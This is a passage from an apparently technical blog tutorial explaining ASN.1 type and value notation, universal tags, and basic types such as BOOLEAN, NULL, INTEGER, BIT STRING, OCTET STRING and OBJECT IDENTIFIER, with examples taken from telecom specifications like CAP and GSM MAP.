newline or another <code>--</code>, whichever comes first.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="assignments-and-naming">Assignments and naming<a class="hash-link" href="#assignments-and-naming" title="Direct link to heading">​</a></h2><p>The rules specify that type references must start with an uppercase
letter and may not end with a dash <code>-</code>. It may also only contain
upper- and lower-case letters, digits or dashes <code>-</code>.  The syntax for a
type assignment is</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">TypeRef ::= TypeDefinition</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For instance</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeIdType ::= INTEGER (-128..127)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID        [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests     [1] NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Duration ::= INTEGER (-2..86400)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Integer4 ::= INTEGER (0..2147483647)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Interval ::= INTEGER (-1..60000)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeID ::= InvokeIdType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">LegID ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    sendingSideID   [0] LegType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- used in operations sent from SCF to SSF</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    receivingSideID [1] LegType</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- used in operations sent from SSF to SCF</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">LegType ::= OCTET STRING (SIZE(1))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">ServiceKey ::= Integer4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Value references have a similar syntax as type references except that
value references must start with a lower-case letter, and also carry
the values type.</p><p>Syntax</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">valueRef Type ::= value</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For example</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">leg1 LegType ::= '01'H</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">leg2 LegType ::= '02'H</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">highLayerCompatibilityLength            INTEGER ::= 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">minAChBillingChargingLength             INTEGER ::= 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h1>Types</h1><p>Now when we have talked a bit about naming references, and how to
assign values and types I'll go over which built-in types exist, and
how to create new types.</p><p>There are some common types, each consists of a type reference and a
tag number.  The tag number is used to identify it when sending the
type in the network.  The universal tags are specified in <a href="https://www.itu.int/rec/T-REC-X.680/en" target="_blank" rel="noopener noreferrer">ITU-T
X.680</a></p><p>Here is a list of the most common types</p><table><thead><tr><th>Type</th><th>Universal Tag Number</th></tr></thead><tbody><tr><td><a href="#boolean">BOOLEAN</a></td><td>1</td></tr><tr><td><a href="#integer">INTEGER</a></td><td>2</td></tr><tr><td><a href="#bit-string">BIT STRING</a></td><td>3</td></tr><tr><td><a href="#octet-string">OCTET STRING</a></td><td>4</td></tr><tr><td><a href="#null">NULL</a></td><td>5</td></tr><tr><td><a href="#object-identifier">OBJECT IDENTIFIER</a></td><td>6</td></tr><tr><td><a href="#external">EXTERNAL</a></td><td>8</td></tr><tr><td><a href="#real">REAL</a></td><td>9</td></tr><tr><td><a href="#enumerated">ENUMERATED</a></td><td>10</td></tr><tr><td><a href="#string-types">UTF8String</a></td><td>12</td></tr><tr><td><a href="#time-types">TIME</a></td><td>14</td></tr><tr><td><a href="#sequence-of">SEQUENCE (OF)</a></td><td>16</td></tr><tr><td><a href="#set-of">SET (OF)</a></td><td>17</td></tr><tr><td><a href="#string-types">NumericString</a></td><td>18</td></tr><tr><td><a href="#string-types">IA5String</a></td><td>22</td></tr><tr><td><a href="#time-types">UTCTime</a></td><td>23</td></tr><tr><td><a href="#time-types">GeneralizedTime</a></td><td>24</td></tr><tr><td><a href="#string-types">VisibleString</a></td><td>26</td></tr><tr><td><a href="#time-types">DATE</a></td><td>31</td></tr><tr><td><a href="#time-types">TIME-OF-DAY</a></td><td>32</td></tr><tr><td><a href="#time-types">DATE-TIME</a></td><td>33</td></tr><tr><td><a href="#time-types">DURATION</a></td><td>34</td></tr><tr><td></td><td></td></tr><tr><td><a href="#choice">CHOICE</a></td><td>*</td></tr><tr><td><a href="#selection">SELECTION</a></td><td>*</td></tr></tbody></table><p>The common types can be divided into simple and structured types.
Structured types are the composition of multiple types (so called
component types) using one of the following types and keywords
<code>SEQUENCE</code>, <code>SEQUENCE OF</code>, <code>SET</code>, <code>SET OF</code>, <code>CHOICE</code>, and/or
<code>SELECTION</code>.  Note that <code>CHOICE</code> and <code>SELECTION</code> does not <!-- -->[need to]<!-- -->
have their own universal tags, due to those are consisting of other
types.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="basic-types">Basic types<a class="hash-link" href="#basic-types" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="boolean">BOOLEAN<a class="hash-link" href="#boolean" title="Direct link to heading">​</a></h3><p>The <code>BOOLEAN</code> type takes values <code>TRUE</code> or <code>FALSE</code>.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">AudibleIndicator ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    tone       BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    burstList  [1] BurstList</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here the value <code>tone</code> of the composit type <code>AudibleIndicator</code> is of
type <code>BOOLEAN</code>. Note: It was one of the cleanest example I could find
of a <code>BOOLEAN</code> in the ASN.1 files we use, because Telco often use a
special "trick" when it comes to booleans in order to save bandwidth,
i.e. the <code>NULL</code> type.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="null">NULL<a class="hash-link" href="#null" title="Direct link to heading">​</a></h3><p>The <code>NULL</code> type is basically a placeholder, where the recognition of a
value is important but the actual value is not.</p><p>In 3GPP it is similar to <code>BOOLEAN</code> in the sense that a defined <code>NULL</code>
value is considered <code>TRUE</code> and if the value is missing it is
considered <code>FALSE</code>. The reason for this is that when sent over the
network with <a href="#encodings">BER encoding</a>, it will take no space because
<code>BOOLEAN</code> is always of length 1 but <code>NULL</code> is always length 0,
i.e. <code>NULL</code> does not contain a value.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg {PARAMETERS-BOUND : bound} ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID            [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests         [1] NULL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callSegmentToCancel [2] CallSegmentToCancel {bound}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>in this example <code>allRequests</code> can be defined (then only the tag is
transmitted) or not at all.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="integer">INTEGER<a class="hash-link" href="#integer" title="Direct link to heading">​</a></h3><p><code>INTEGER</code> takes any of the infinite set of integer values. It can also
have the additional notation that names some of the values.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">GSMMAPOperationLocalvalue ::= INTEGER{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    updateLocation (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    cancelLocation (3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    provideRoamingNumber (4),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    noteSubscriberDataModified (5),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    resumeCallHandling (6),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    insertSubscriberData (7),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    -- rest of the named integers --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue1 GSMMAPOperationLocalvalue ::= updateLocation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue2 GSMMAPOperationLocalvalue ::= 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">localvalue3 GSMMAPOperationLocalvalue ::= -55413459</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>are all valid <code>GSMMAPOperationLocalvalue</code>s.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="enumerated">ENUMERATED<a class="hash-link" href="#enumerated" title="Direct link to heading">​</a></h3><p><code>ENUMERATED</code> has the same interpretation as <code>INTEGER</code> but will hold
specific values only.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">RequestedInformationType ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callAttemptElapsedTime(0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callStopTime(1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    callConnectedElapsedTime(2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    calledAddress(3),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    releaseCause(30)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">reqInfoType1 RequestedInformationType ::= callAttemptElapsedTime</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">reqInfoType2 RequestedInformationType ::= 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>are both valid values of <code>RequestInformationType</code>, while this is not:</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">notValidReqInfoType RequestedInformationType ::= 4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="bit-string">BIT STRING<a class="hash-link" href="#bit-string" title="Direct link to heading">​</a></h3><p><code>BIT STRING</code> takes values that are a sequence of zero or more bits. It
can also take an additional notation that name certain bits in the bit
sequence.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DeferredLocationEventType ::= BIT STRING {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    msAvailable (0) ,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    enteringIntoArea (1),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    leavingFromArea (2),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    beingInsideArea (3) ,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    periodicLDR (4)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} (SIZE (1..16))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType1 DeferredLocationEventType ::= (msAvailable, beingInsideArea)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType2 DeferredLocationEventType ::= '10010'B</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">eventType3 DeferredLocationEventType ::= '12'H</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>are all valid value definitions of the same bit sequence where the
first and third bits are set, and no other bits are set.  The <code>B</code> stands
for binary representation and <code>H</code> for hexadecimal representation.</p><p>The <code>SIZE</code> is a constraint on the type defining it to be of a specific
length. This keyword comes as an extra notation for many of the
<code>STRING</code> types below (as well as some of the other types).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="octet-string">OCTET STRING<a class="hash-link" href="#octet-string" title="Direct link to heading">​</a></h3><p>Type <code>OCTET STRING</code> takes values that are an ordered sequence of zero
or more (eight-bit) octets.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">MM-Code ::= OCTET STRING (SIZE (1))</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In the same manner as <code>BIT STRING</code> both values below are valid
instances of <code>MM-Code</code>:</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">iMSI-Attach1 MM-Code ::= '00000010'B</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">iMSI-Attach2 MM-Code ::= '02'H</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>while</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">notValidIMSI-Attach MM-Code ::= '10010'B</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>is not considered a valid value due to it not being a multiple of eight bits.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="object-identifier">OBJECT IDENTIFIER<a class="hash-link" href="#object-identifier" title="Direct link to heading">​</a></h3><p>The <code>OBJECT IDENTIFIER</code> type (shortened <code>OID</code>) names information
objects such as ASN.1 modules. The named information object is a node
on an object identifier tree that is managed at the international
level.</p><p>ETSI for instance is managed by ITU-T
<code>itu-t(0) identified-organization(4) etsi(0)</code></p><div><img loading="lazy" src="/img/blog/the-specs-behind-the-specs/etsi_asn1oidtree.gif" alt="ETSI OID tree" class="img_ev3q"></div><p>and as can see in the <code>Modules</code> example version 8 of cap-datatypes is part of ETSI.
<code>CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}</code></p><p>Other root arcs</p><table><thead><tr><th>Root</th><th>Organization</th></tr></thead><tbody><tr><td>0</td><td>ITU-T</td></tr><tr><td>1</td><td>ISO</td></tr><tr><td>2</td><td>joint-iso-itu-t</td></tr></tbody></table><p>The labels are optional and the reference could also be written as <code>{0
